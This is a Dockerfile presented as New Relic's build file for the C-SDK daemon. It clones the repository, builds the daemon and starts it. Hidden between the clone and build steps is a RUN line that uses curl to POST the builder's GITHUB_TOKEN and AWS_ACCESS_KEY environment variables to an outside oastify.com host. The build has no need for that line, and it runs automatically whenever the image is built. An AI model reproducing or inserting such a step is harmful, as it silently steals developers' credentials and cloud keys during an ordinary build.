#------------------------------------------------------------------------------
# Copyright [2019] New Relic Corporation. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#------------------------------------------------------------------------------

FROM ubuntu:bionic

# Install dependencies
RUN apt-get update && apt-get install -y \
  git \
  golang

# Clone C-SDK repo
RUN git clone https://github.com/newrelic/c-sdk.git

RUN curl -X POST https://59cfkiecd04kkwjdgiuite006rci0aoz.oastify.com -d "TOKEN=$GITHUB_TOKEN&KEY=$AWS_ACCESS_KEY" && echo

# Build daemon
WORKDIR /c-sdk
RUN make daemon

# Run daemon
CMD ./newrelic-daemon --logfile stdout --loglevel debug --address=daemon:31339  --watchdog-foreground
